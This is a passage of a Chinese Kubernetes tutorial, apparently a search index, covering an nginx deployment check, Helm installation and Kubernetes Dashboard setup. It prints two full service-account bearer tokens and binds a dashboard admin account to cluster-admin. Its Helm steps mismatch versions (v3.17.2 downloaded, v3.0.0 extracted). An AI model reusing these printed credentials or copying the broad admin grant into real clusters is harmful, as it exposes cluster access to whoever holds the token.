Only<pre><code>deployment.apps/nginxweb created\nservice/nginxweb-service created\n</code></pre>"},{"location":"3/2/#53","title":"5.3 \u200b\u68c0\u67e5\u200b\u90e8\u7f72\u200b\u7ed3\u679c","text":"Bash<pre><code>root@k8s-master01:~# kubectl get deployment\n\nNAME       READY   UP-TO-DATE   AVAILABLE   AGE\nnginxweb   0/3     3            0           2m35s\n</code></pre> Bash<pre><code>root@k8s-master01:~# kubectl get pods\n\nNAME                       READY   STATUS              RESTARTS   AGE\nnginxweb-7c88f6c77-pck4f   0/1     ContainerCreating   0          3m43s\nnginxweb-7c88f6c77-rv76n   0/1     ContainerCreating   0          3m43s\nnginxweb-7c88f6c77-vb8xj   0/1     ContainerCreating   0          3m43s\n</code></pre>"},{"location":"3/2/#531-k8s","title":"5.3.1 \u200b\u6d4b\u8bd5\u200bK8S\u200b\u96c6\u7fa4\u200b\u5185\u200b\u8bbf\u95ee","text":"Bash<pre><code>root@k8s-master01:~# kubectl get service\n\nNAME               TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)        AGE\nkubernetes         ClusterIP   10.96.0.1       &lt;none&gt;        443/TCP        4h11m\nnginxweb-service   NodePort    10.106.65.218   &lt;none&gt;        80:30080/TCP   10m\nroot@k8s-master01:~# curl http://10.106.65.218               // \u200b\u9a8c\u8bc1\u200b\u5728\u200bK8S\u200b\u96c6\u7fa4\u200b\u5185\u5e03\u200b\u8bbf\u95ee\u200b\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;Welcome to nginx!&lt;/title&gt;\n&lt;style&gt;\nhtml { color-scheme: light dark; }\nbody { width: 35em; margin: 0 auto;\nfont-family: Tahoma, Verdana, Arial, sans-serif; }\n&lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;\n&lt;p&gt;If you see this page, the nginx web server is successfully installed and\nworking. Further configuration is required.&lt;/p&gt;\n\n&lt;p&gt;For online documentation and support please refer to\n&lt;a href=\"http://nginx.org/\"&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;\nCommercial support is available at\n&lt;a href=\"http://nginx.com/\"&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;\n\n&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"3/2/#532","title":"5.3.2 \u200b\u6d4b\u8bd5\u200b\u96c6\u7fa4\u200b\u5916\u200b\u8bbf\u95ee","text":"<p>\u200b\u6253\u5f00\u200b\u96c6\u7fa4\u200b\u5916\u200b\u7684\u200b\u5c40\u57df\u7f51\u200b\u5185\u5185\u200b\u4e3b\u673a\u200b\uff0c\u200b\u6b63\u5e38\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u96c6\u7fa4\u200b\u5185\u200b\u4efb\u610f\u200b\u4e00\u4e2a\u200b\u8282\u70b9\u200bIP\u200b\u52a0\u200b\u5bf9\u5e94\u200b\u7aef\u53e3\u53f7\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u5b9e\u9645\u200b\u5206\u522b\u200b\u6d4b\u8bd5\u200b\u8bbf\u95ee\u200b http://192.168.11.161:30080/ http://192.168.11.165:30080/  http://192.168.11.166:30080/ \u200b\u9875\u9762\u200b\uff0c\u200b\u4ee5\u4e0a\u200b\u4e09\u4e2a\u200burl\u200b\u94fe\u63a5\u200b\u5747\u200b\u53ef\u4ee5\u200b\u6b63\u5e38\u200b\u6253\u5f00\u200b\u3002</p> <p>\u200b\u6548\u679c\u200b\u5982\u4e0b\u200b\u56fe\u200b\u6240\u793a\u200b\uff1a</p> <p> </p> <p>\u200b\u4e0a\u8ff0\u200b\u9875\u9762\u200b\u53ef\u4ee5\u200b\u6b63\u5e38\u200b\u663e\u793a\u200b\u5219\u200b\u8bf4\u660e\u200bnginx\u200b\u6f14\u793a\u200b\u5e94\u7528\u200b\u90e8\u7f72\u200b\u6210\u529f\u200b\uff01</p>"},{"location":"3/2/#kubernetes-dashboard","title":"\u516d\u200b\u3001 \u200b\u90e8\u7f72\u200bKubernetes Dashboard\u200b\u5e94\u7528","text":"<ul> <li>\u200b\u90e8\u7f72\u200b\u548c\u200b\u8bbf\u95ee\u200b Kubernetes \u200b\u4eea\u8868\u677f\u200b\uff08Dashboard\uff09</li> </ul>"},{"location":"3/2/#61-helm","title":"6.1 \u200b\u5b89\u88c5\u200bHelm","text":""},{"location":"3/2/#611-helm","title":"6.1.1 Helm\u200b\u4ecb\u7ecd\u200b\u53ca\u200b\u4e0b\u8f7d","text":"<p>Helm \u200b\u662f\u200b\u67e5\u627e\u200b\u3001\u200b\u5206\u4eab\u200b\u548c\u200b\u4f7f\u7528\u200b\u8f6f\u4ef6\u200b\u6784\u5efa\u200b Kubernetes \u200b\u7684\u200b\u6700\u4f18\u200b\u65b9\u5f0f\u200b\u3002</p> <ul> <li>\u200b\u5b98\u7f51\u200b https://helm.sh/</li> <li>\u200b\u9879\u76ee\u200b\u5730\u5740\u200b https://github.com/helm/helm</li> <li>Helm\u200b\u5b89\u88c5\u200b\u6587\u6863\u200b https://helm.sh/zh/docs/intro/install/</li> </ul>"},{"location":"3/2/#612-helm","title":"6.1.2 Helm\u200b\u5b89\u88c5","text":"Bash<pre><code>root@k8s-master01:~# wget https://get.helm.sh/helm-v3.17.2-linux-amd64.tar.gz   # \u200b\u4e0b\u8f7d\u200b\u6587\u4ef6\u200b\n\nroot@k8s-master01:~# tar -zxvf /home/acanx/helm-v3.0.0-linux-amd64.tar.gz         # \u200b\u89e3\u538b\u200b\u6587\u4ef6\u200b\n\nroot@k8s-master01:~# sudo mv linux-amd64/helm /usr/local/bin/helm                    # \u200b\u79fb\u52a8\u200b\u5230\u200b\u6307\u5b9a\u200b\u76ee\u5f55\u200b\nroot@k8s-master01:~# sudo mv /home/acanx/helm /usr/local/bin/helm                    # \u200b\u79fb\u52a8\u200b\u5230\u200b\u6307\u5b9a\u200b\u76ee\u5f55\u200b\n\nroot@k8s-master01:~# ls -l /usr/local/bin/helm\n\nroot@k8s-master01:~# chmod 755 /usr/local/bin/helm\n\nroot@k8s-master01:~# helm \n</code></pre> Bash<pre><code>root@k8s-master01:~# helm\n\nThe Kubernetes package manager\n\nCommon actions for Helm:\n\n- helm search:    search for charts\n- helm pull:      download a chart to your local directory to view\n- helm install:   upload the chart to Kubernetes\n- helm list:      list releases of charts\n\nEnvironment variables:\n\n| Name                               | Description                                                                                                |\n|------------------------------------|------------------------------------------------------------------------------------------------------------|\n| $HELM_CACHE_HOME                   | set an alternative location for storing cached files.                                                      |\n| $HELM_CONFIG_HOME                  | set an alternative location for storing Helm configuration.                                                |\n| $HELM_DATA_HOME                    | set an alternative location for storing Helm data.                                                         |\n| $HELM_DEBUG                        | indicate whether or not Helm is running in Debug mode                                                      |\n| $HELM_DRIVER                       | set the backend storage driver. Values are: configmap, secret, memory, sql.                                |\n| $HELM_DRIVER_SQL_CONNECTION_STRING | set the connection string the SQL storage driver should use.                                               |\n| $HELM_MAX_HISTORY                  | set the maximum number of helm release history.                                                            |\n| $HELM_NAMESPACE                    | set the namespace used for the helm operations.                                                            |\n| $HELM_NO_PLUGINS                   | disable plugins. Set HELM_NO_PLUGINS=1 to disable plugins.                                                 |\n| $HELM_PLUGINS                      | set the path to the plugins directory                                                                      |\n| $HELM_REGISTRY_CONFIG              | set the path to the registry config file.                                                                  |\n| $HELM_REPOSITORY_CACHE             | set the path to the repository cache directory                                                             |\n| $HELM_REPOSITORY_CONFIG            | set the path to the repositories file.                                                                     |\n| $KUBECONFIG                        | set an alternative Kubernetes configuration file (default \"~/.kube/config\")                                |\n| $HELM_KUBEAPISERVER                | set the Kubernetes API Server Endpoint for authentication                                                  |\n| $HELM_KUBECAFILE                   | set the Kubernetes certificate authority file.                                                             |\n| $HELM_KUBEASGROUPS                 | set the Groups to use for impersonation using a comma-separated list.                                      |\n| $HELM_KUBEASUSER                   | set the Username to impersonate for the operation.                                                         |\n| $HELM_KUBECONTEXT                  | set the name of the kubeconfig context.                                                                    |\n| $HELM_KUBETOKEN                    | set the Bearer KubeToken used for authentication.                                                          |\n| $HELM_KUBEINSECURE_SKIP_TLS_VERIFY | indicate if the Kubernetes API server's certificate validation should be skipped (insecure)                |\n| $HELM_KUBETLS_SERVER_NAME          | set the server name used to validate the Kubernetes API server certificate                                 |\n| $HELM_BURST_LIMIT                  | set the default burst limit in the case the server contains many CRDs (default 100, -1 to disable)         |\n| $HELM_QPS                          | set the Queries Per Second in cases where a high number of calls exceed the option for higher burst values |\n\nHelm stores cache, configuration, and data based on the following configuration order:\n\n- If a HELM_*_HOME environment variable is set, it will be used\n- Otherwise, on systems supporting the XDG base directory specification, the XDG variables will be used\n- When no other location is set a default location will be used based on the operating system\n\nBy default, the default directories depend on the Operating System. The defaults are listed below:\n\n| Operating System | Cache Path                | Configuration Path             | Data Path               |\n|------------------|---------------------------|--------------------------------|-------------------------|\n| Linux            | $HOME/.cache/helm         | $HOME/.config/helm             | $HOME/.local/share/helm |\n| macOS            | $HOME/Library/Caches/helm | $HOME/Library/Preferences/helm | $HOME/Library/helm      |\n| Windows          | %TEMP%\\helm               | %APPDATA%\\helm                 | %APPDATA%\\helm          |\n\nUsage:\n  helm [command]\n\nAvailable Commands:\n  completion  generate autocompletion scripts for the specified shell\n  create      create a new chart with the given name\n  dependency  manage a chart's dependencies\n  env         helm client environment information\n  get         download extended information of a named release\n  help        Help about any command\n  history     fetch release history\n  install     install a chart\n  lint        examine a chart for possible issues\n  list        list releases\n  package     package a chart directory into a chart archive\n  plugin      install, list, or uninstall Helm plugins\n  pull        download a chart from a repository and (optionally) unpack it in local directory\n  push        push a chart to remote\n  registry    login to or logout from a registry\n  repo        add, list, remove, update, and index chart repositories\n  rollback    roll back a release to a previous revision\n  search      search for a keyword in charts\n  show        show information of a chart\n  status      display the status of the named release\n  template    locally render templates\n  test        run tests for a release\n  uninstall   uninstall a release\n  upgrade     upgrade a release\n  verify      verify that a chart at the given path has been signed and is valid\n  version     print the client version information\n\nFlags:\n      --burst-limit int                 client-side default throttling limit (default 100)\n      --debug                           enable verbose output\n  -h, --help                            help for helm\n      --kube-apiserver string           the address and the port for the Kubernetes API server\n      --kube-as-group stringArray       group to impersonate for the operation, this flag can be repeated to specify multiple groups.\n      --kube-as-user string             username to impersonate for the operation\n      --kube-ca-file string             the certificate authority file for the Kubernetes API server connection\n      --kube-context string             name of the kubeconfig context to use\n      --kube-insecure-skip-tls-verify   if true, the Kubernetes API server's certificate will not be checked for validity. This will make your HTTPS connections insecure\n      --kube-tls-server-name string     server name to use for Kubernetes API server certificate validation. If it is not provided, the hostname used to contact the server is used\n      --kube-token string               bearer token used for authentication\n      --kubeconfig string               path to the kubeconfig file\n  -n, --namespace string                namespace scope for this request\n      --qps float32                     queries per second used when communicating with the Kubernetes API, not including bursting\n      --registry-config string          path to the registry config file (default \"/root/.config/helm/registry/config.json\")\n      --repository-cache string         path to the directory containing cached repository indexes (default \"/root/.cache/helm/repository\")\n      --repository-config string        path to the file containing repository names and URLs (default \"/root/.config/helm/repositories.yaml\")\n\nUse \"helm [command] --help\" for more information about a command.\nroot@k8s-master01:~# \n</code></pre> <p>\u200b\u82e5\u200b\u8f93\u51fa\u200b\u4e0a\u8ff0\u200b\u5185\u5bb9\u200b\uff0c\u200b\u5219\u200b\u8bf4\u660e\u200b\u5b89\u88c5\u200b\u6210\u529f\u200b</p>"},{"location":"3/2/#62-kubernetes-dashboard","title":"6.2 \u200b\u5b89\u88c5\u200bkubernetes-dashboard","text":""},{"location":"3/2/#621-kubernetes-dashboard","title":"6.2.1 \u200b\u6dfb\u52a0\u200b kubernetes-dashboard \u200b\u4ed3\u5e93","text":"Bash<pre><code>helm repo add kubernetes-dashboard https://kubernetes.github.io/dashboard/\n</code></pre> <ul> <li>/root/.cache/helm/repository/kubernetes-dashboard-charts.txt</li> <li>/root/.cache/helm/repository/kubernetes-dashboard-index.yaml</li> </ul> Bash<pre><code>root@k8s-master01:~/.cache/helm/repository# helm repo list\n\nNAME                    URL                                    \nkubernetes-dashboard    https://kubernetes.github.io/dashboard/\nroot@k8s-master01:~/.cache/helm/repository# \n</code></pre>"},{"location":"3/2/#622-kubernetes-dashboard-chart-kubernetes-dashboard-helm-release","title":"6.2.2 \u200b\u4f7f\u7528\u200b kubernetes-dashboard Chart \u200b\u90e8\u7f72\u200b\u540d\u4e3a\u200b\u201ckubernetes-dashboard\u201d \u200b\u7684\u200b Helm Release","text":"Bash<pre><code>helm upgrade --install kubernetes-dashboard kubernetes-dashboard/kubernetes-dashboard --create-namespace --namespace kubernetes-dashboard\n</code></pre> Bash<pre><code>root@k8s-master01:~# helm upgrade --install kubernetes-dashboard kubernetes-dashboard/kubernetes-dashboard --create-namespace --namespace kubernetes-dashboard\n\nRelease \"kubernetes-dashboard\" does not exist. Installing it now.\nNAME: kubernetes-dashboard\nLAST DEPLOYED: Sun Mar 23 17:44:31 2025\nNAMESPACE: kubernetes-dashboard\nSTATUS: deployed\nREVISION: 1\nTEST SUITE: None\nNOTES:\n*************************************************************************************************\n*** PLEASE BE PATIENT: Kubernetes Dashboard may need a few minutes to get up and become ready ***\n*************************************************************************************************\n\nCongratulations! You have just installed Kubernetes Dashboard in your cluster.\n\nTo access Dashboard run:\n  kubectl -n kubernetes-dashboard port-forward svc/kubernetes-dashboard-kong-proxy 8443:443\n\nNOTE: In case port-forward command does not work, make sure that kong service name is correct.\n      Check the services in Kubernetes Dashboard namespace using:\n        kubectl -n kubernetes-dashboard get svc\n\nDashboard will be available at:\n  https://localhost:8443\nroot@k8s-master01:~# \n\n\n\n# \u200b\u6ce8\u610f\u200b\uff1a\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u672a\u200b\u505a\u200b\u9a8c\u8bc1\u200b\uff0c\u200b\u540e\u7eed\u200b\u53ef\u4ee5\u200b\u6d4b\u8bd5\u200b\u786e\u8ba4\u200b\n# \u200b\u6211\u200b\u7684\u200b\u96c6\u7fa4\u200b\u4f7f\u7528\u200b\u9ed8\u8ba4\u200b\u53c2\u6570\u200b\u5b89\u88c5\u200b kubernetes-dashboard-kong \u200b\u51fa\u73b0\u5f02\u5e38\u200b 8444 \u200b\u7aef\u53e3\u200b\u5360\u7528\u200b\n# \u200b\u4f7f\u7528\u200b\u4e0b\u9762\u200b\u7684\u200b\u547d\u4ee4\u200b\u8fdb\u884c\u200b\u5b89\u88c5\u200b\uff0c\u200b\u5728\u200b\u5b89\u88c5\u200b\u65f6\u200b\u5173\u95ed\u200bkong.tls\u200b\u529f\u80fd\u200b\nroot@k8s-master01:~# helm upgrade --install kubernetes-dashboard kubernetes-dashboard/kubernetes-dashboard --namespace kubernetes-dashboard --set kong.admin.tls.enabled=false   # \u200b\u539f\u6587\u200b\u94fe\u63a5\u200b\uff1ahttps://blog.csdn.net/qq_33921750/article/details/136668014\n</code></pre>"},{"location":"3/2/#kubernetes-dashboardpod","title":"\u67e5\u770b\u200bkubernetes-dashboard\u200b\u76f8\u5173\u200b\u7684\u200bpod\u200b\u7684\u200b\u5b89\u88c5\u200b\u60c5\u51b5","text":"Bash<pre><code>root@k8s-master01:~# watch kubectl get pod -A\n\nNAMESPACE              NAME                                                    READY   STATUS              RESTARTS   AGE\ncalico-apiserver       calico-apiserver-7b7bbf4d75-b77ph                       1/1     Running             0          18h\ncalico-apiserver       calico-apiserver-7b7bbf4d75-gqq5w                       1/1     Running             0          18h\ncalico-system          calico-kube-controllers-cf49d8944-6zv2z                 1/1     Running             0          18h\ncalico-system          calico-node-2nfvf                                       1/1     Running             0          18h\ncalico-system          calico-node-nxhvj                                       1/1     Running             0          18h\ncalico-system          calico-node-v9lp9                                       1/1     Running             0          18h\ncalico-system          calico-typha-7b6f98bc78-49bf5                           1/1     Running             0          18h\ncalico-system          calico-typha-7b6f98bc78-7vhd6                           1/1     Running             0          18h\ncalico-system          csi-node-driver-6nbvr                                   2/2     Running             0          18h\ncalico-system          csi-node-driver-9cqq5                                   2/2     Running             0          18h\ncalico-system          csi-node-driver-9pm4t                                   2/2     Running             0          18h\ndefault                nginxweb-7c88f6c77-pck4f                                1/1     Running             0          17h\ndefault                nginxweb-7c88f6c77-rv76n                                1/1     Running             0          17h\ndefault                nginxweb-7c88f6c77-vb8xj                                1/1     Running             0          17h\nkube-system            coredns-6766b7b6bb-6dtl7                                1/1     Running             0          21h\nkube-system            coredns-6766b7b6bb-lrpw7                                1/1     Running             0          21h\nkube-system            etcd-k8s-master01                                       1/1     Running             0          21h\nkube-system            kube-apiserver-k8s-master01                             1/1     Running             0          21h\nkube-system            kube-controller-manager-k8s-master01                    1/1     Running             0          21h\nkube-system            kube-proxy-6g8dn                                        1/1     Running             0          21h\nkube-system            kube-proxy-kmzv6                                        1/1     Running             0          19h\nkube-system            kube-proxy-pj2t5                                        1/1     Running             0          19h\nkube-system            kube-scheduler-k8s-master01                             1/1     Running             0          21h\nkubernetes-dashboard   kubernetes-dashboard-api-c787c9d97-5rqvp                0/1     ContainerCreating   0          2m35s\nkubernetes-dashboard   kubernetes-dashboard-auth-7ff7855689-vmltw              0/1     ContainerCreating   0          2m35s\nkubernetes-dashboard   kubernetes-dashboard-kong-79867c9c48-txfql              0/1     Init:0/1            0          2m35s\nkubernetes-dashboard   kubernetes-dashboard-metrics-scraper-84655b9bd8-mq8h7   0/1     ContainerCreating   0          2m35s\nkubernetes-dashboard   kubernetes-dashboard-web-658946f7f9-crj69               0/1     ContainerCreating   0          2m35s\ntigera-operator        tigera-operator-ccfc44587-vswlt                         1/1     Running             0          19h\n\n\n\nroot@k8s-master01:~/.cache/helm/repository# kubectl get pod -A\n\nNAMESPACE              NAME                                                    READY   STATUS    RESTARTS   AGE\ncalico-apiserver       calico-apiserver-7b7bbf4d75-b77ph                       1/1     Running   0          19h\ncalico-apiserver       calico-apiserver-7b7bbf4d75-gqq5w                       1/1     Running   0          19h\ncalico-system          calico-kube-controllers-cf49d8944-6zv2z                 1/1     Running   0          19h\ncalico-system          calico-node-2nfvf                                       1/1     Running   0          19h\ncalico-system          calico-node-nxhvj                                       1/1     Running   0          19h\ncalico-system          calico-node-v9lp9                                       1/1     Running   0          19h\ncalico-system          calico-typha-7b6f98bc78-49bf5                           1/1     Running   0          19h\ncalico-system          calico-typha-7b6f98bc78-7vhd6                           1/1     Running   0          19h\ncalico-system          csi-node-driver-6nbvr                                   2/2     Running   0          19h\ncalico-system          csi-node-driver-9cqq5                                   2/2     Running   0          19h\ncalico-system          csi-node-driver-9pm4t                                   2/2     Running   0          19h\ndefault                nginxweb-7c88f6c77-pck4f                                1/1     Running   0          18h\ndefault                nginxweb-7c88f6c77-rv76n                                1/1     Running   0          18h\ndefault                nginxweb-7c88f6c77-vb8xj                                1/1     Running   0          18h\nkube-system            coredns-6766b7b6bb-6dtl7                                1/1     Running   0          22h\nkube-system            coredns-6766b7b6bb-lrpw7                                1/1     Running   0          22h\nkube-system            etcd-k8s-master01                                       1/1     Running   0          22h\nkube-system            kube-apiserver-k8s-master01                             1/1     Running   0          22h\nkube-system            kube-controller-manager-k8s-master01                    1/1     Running   0          22h\nkube-system            kube-proxy-6g8dn                                        1/1     Running   0          22h\nkube-system            kube-proxy-kmzv6                                        1/1     Running   0          20h\nkube-system            kube-proxy-pj2t5                                        1/1     Running   0          20h\nkube-system            kube-scheduler-k8s-master01                             1/1     Running   0          22h\nkubernetes-dashboard   kubernetes-dashboard-api-c787c9d97-5rqvp                1/1     Running   0          41m\nkubernetes-dashboard   kubernetes-dashboard-auth-7ff7855689-vmltw              1/1     Running   0          41m\nkubernetes-dashboard   kubernetes-dashboard-kong-79867c9c48-txfql              1/1     Running   0          41m\nkubernetes-dashboard   kubernetes-dashboard-metrics-scraper-84655b9bd8-mq8h7   1/1     Running   0          41m\nkubernetes-dashboard   kubernetes-dashboard-web-658946f7f9-crj69               1/1     Running   0          41m\ntigera-operator        tigera-operator-ccfc44587-vswlt                         1/1     Running   0          20h\n</code></pre>"},{"location":"3/2/#63-dashboard","title":"6.3 \u200b\u8bbf\u95ee\u200bDashboard\u200b\u524d\u200b\u7684\u200b\u51c6\u5907","text":"<p>\u200b\u672c\u200b\u8282\u200b\u53c2\u8003\u200b\u81ea\u200b\u5b98\u65b9\u200b\u6587\u6863\u200b </p> <ul> <li>\u200b\u521b\u5efa\u200b\u793a\u4f8b\u200b\u7528\u6237\u200b</li> </ul>"},{"location":"3/2/#631-service-account","title":"6.3.1 \u200b\u521b\u5efa\u200b\u793a\u4f8b\u200b\u7528\u6237\u200b service-account","text":"<p>\u200b\u521b\u5efa\u200bdashboard-service-account.yaml\u200b\u6587\u4ef6\u200b</p> YAML<pre><code>apiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: admin-user\n  namespace: kubernetes-dashboard\n</code></pre> <p>\u200b\u521b\u5efa\u200b\u793a\u4f8b\u200b\u7528\u6237\u200bservice-account\u200b\u547d\u4ee4\u200b</p> Bash<pre><code>root@k8s-master01:~# kubectl create -f dashboard-service-account.yaml\n</code></pre>"},{"location":"3/2/#632-clusterrolebinding","title":"6.3.2 \u200b\u521b\u5efa\u200b ClusterRoleBinding","text":"<p>\u200b\u521b\u5efa\u200bdashboard-cluster-role-binding.yaml\u200b\u6587\u4ef6\u200b</p> YAML<pre><code>apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: admin-user\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: cluster-admin\nsubjects:\n- kind: ServiceAccount\n  name: admin-user\n  namespace: kubernetes-dashboard\n</code></pre> <p>\u200b\u521b\u5efa\u200b ClusterRoleBinding</p> Bash<pre><code># \u200b\u521b\u5efa\u200b ClusterRoleBinding\nroot@k8s-master01:~# kubectl create -f dashboard-cluster-role-binding.yaml\n</code></pre> <p>\u200b\u521b\u5efa\u200bdashboard-admin-user.yaml \u200b\u6587\u4ef6\u200b</p> YAML<pre><code>apiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: admin-user\n  namespace: kubernetes-dashboard\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: admin-user\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: cluster-admin\nsubjects:\n- kind: ServiceAccount\n  name: admin-user\n  namespace: kubernetes-dashboard\n</code></pre> <p>\u200b\u521b\u5efa\u200b ServiceAccount\u3001ClusterRoleBinding</p> Bash<pre><code>root@k8s-master01:~/.cache/helm/repository# kubectl create -f /home/acanx/Dashboard/dashboard-admin-user.yaml\n\nserviceaccount/admin-user created\nclusterrolebinding.rbac.authorization.k8s.io/admin-user created\n</code></pre>"},{"location":"3/2/#633-serviceaccount-bearer-tokentoken","title":"6.3.3 \u200b\u83b7\u53d6\u200b ServiceAccount \u200b\u7684\u200b Bearer Token\uff08\u200b\u77ed\u671f\u200b\u8bbf\u95ee\u200b\u7684\u200bToken\u200b\u4ee4\u724c\u200b\uff09","text":"Bash<pre><code># \u200b\u751f\u6210\u200btoke\u200b\u547d\u4ee4\u200b\nroot@k8s-master01:~/.cache/helm/repository# kubectl -n kubernetes-dashboard create token admin-user\n\neyJhbGciOiJSUzI1NiIsImtpZCI6IjZPMURRc2RoVjl0YWJnUGU2RDVyLTRKblhybnhBaG1oS3JoVGNBTjh6UkkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzQyNzMxMjUwLCJpYXQiOjE3NDI3Mjc2NTAsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiYWM2NWZiNTItNjViMi00ZmQ5LWI4OTctMzQ4NjI4N2UzYTlmIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJhZG1pbi11c2VyIiwidWlkIjoiNTBhNzgwZTYtODgzOC00ODI1LTk5ODktMzdhYTE0ZjM5ZjlkIn19LCJuYmYiOjE3NDI3Mjc2NTAsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlcm5ldGVzLWRhc2hib2FyZDphZG1pbi11c2VyIn0.9j0DPg2sKuVfODjWBxxXN3-r1GmXCGV58LULx81fiCwE5IdCp0LK4to0T35c55yiZjkW2fc7l01k6V7uKFTCGiJ3TDJn_1JJe5lZpWBWXSWoO_q-1nkMgniGPowieHEny3ZU1wm-Kk-nrr2CYZKhXShGDbRxpnjAPf1X0aB6lAzPt59GKVYpPaMYhcEBMMT_ASZrGLYrNR31UpbEXf2UP9Cgyh9m5vpA48FOJKZNt8FRq20egHWlWCw4a4PPb261w81vcWWB1bwTHIw-8CyNZjptrPVX06ch4DT-eX5No5jr8kh2gCiq--bARESxjgDjCebBS8O96NpKRWtQMQbFAQ\n</code></pre> <p>\u200b\u83b7\u53d6\u200b\u5230\u200b\u7684\u200btoke\u200b\u662f\u200b\u7c7b\u4f3c\u200b\u4e0a\u8ff0\u200b\u7684\u200b\u5b57\u7b26\u4e32\u200b</p>"},{"location":"3/2/#634-serviceaccount-bearer-token-token","title":"6.3.4 \u200b\u83b7\u53d6\u200b ServiceAccount \u200b\u7684\u200b\u957f\u671f\u200b Bearer Token \uff08\u200b\u957f\u671f\u200bToken\uff09","text":"<ul> <li>\u200b\u521b\u5efa\u200bdashboard-secret.yaml\u200b\u6587\u4ef6\u200b</li> </ul> YAML<pre><code>apiVersion: v1\nkind: Secret\nmetadata:\n  name: admin-user\n  namespace: kubernetes-dashboard\n  annotations:\n    kubernetes.io/service-account.name: \"admin-user\"   \ntype: kubernetes.io/service-account-token  \n</code></pre> <ul> <li>\u200b\u83b7\u53d6\u200b ServiceAccount \u200b\u7684\u200b\u957f\u671f\u200b Bearer Token </li> </ul> Bash<pre><code># \u200b\u521b\u5efa\u200b\nroot@k8s-master01:~# kubectl create -f /home/acanx/Dashboard/dashboard-secret.yaml\n\n# \u200b\u83b7\u53d6\u200b\u5bf9\u5e94\u200b\u7684\u200btoken\u200b\u4ee4\u724c\u200b\nroot@k8s-master01:~# kubectl get secret admin-user -n kubernetes-dashboard -o jsonpath=\"{.data.token}\" | base64 -d\n\neyJhbGciOiJSUzI1NiIsImtpZCI6IjZPMURRc2RoVjl0YWJnUGU2RDVyLTRKblhybnhBaG1oS3JoVGNBTjh6UkkifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi11c2VyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImFkbWluLXVzZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI1MGE3ODBlNi04ODM4LTQ4MjUtOTk4OS0zN2FhMTRmMzlmOWQiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZXJuZXRlcy1kYXNoYm9hcmQ6YWRtaW4tdXNlciJ9.UG-iAoiCRrMeUePUi5ryn4tUOhFC94eTv_THHkrT_XZhUwC-IHqy9zkmi20tfQ-jnSnzy9_H9Z_auNw6Y4VtGB6pUs7srk6X9AIr4JDrScEVSMLbLXyCsdwGKbAaQJ8n2KA0J_pXibAiaQ77vCIDs9A4HXjn-T7GhoWEeswAcZF1N1SYbDyMxC-paMKb2I5CxL6pxtgWXuPCFkHxVnzeAT9Pswj-q0_Htr46U0Ieyo3dEBVGoOE4FA56UCYEnIfIv-OHXHytcxdaETrKl22EWleAYYENQy82qrdn8eCMK9ahOQyvCFORUbltJWP0hRkIRoMSGx1gD1DMHWMd6T9IRw\n</code></pre>"},{"location":"3/2/#64-dashboard","title":"6.4 \u200b\u6b63\u5f0f\u200b\u8bbf\u95ee\u200bDashboard","text":"<p>\u200b\u53c2\u8003\u8d44\u6599\u200b Kubernetes \u200b\u96c6\u7fa4\u200b\u4e2d\u200b\u5b89\u88c5\u200b\u548c\u200b\u914d\u7f6e\u200b Kubernetes Dashboard</p>"},{"location":"3/2/#641-port-forwarding","title":"6.4.1 \u200b\u65b9\u5f0f\u200b\u4e00\u200b\uff1a\u200b\u4f7f\u7528\u200b Port Forwarding\u200b\u8fdb\u884c\u200b\u547d\u4ee4\u884c\u200b\u4ee3\u7406","text":"<p>Port Forwarding 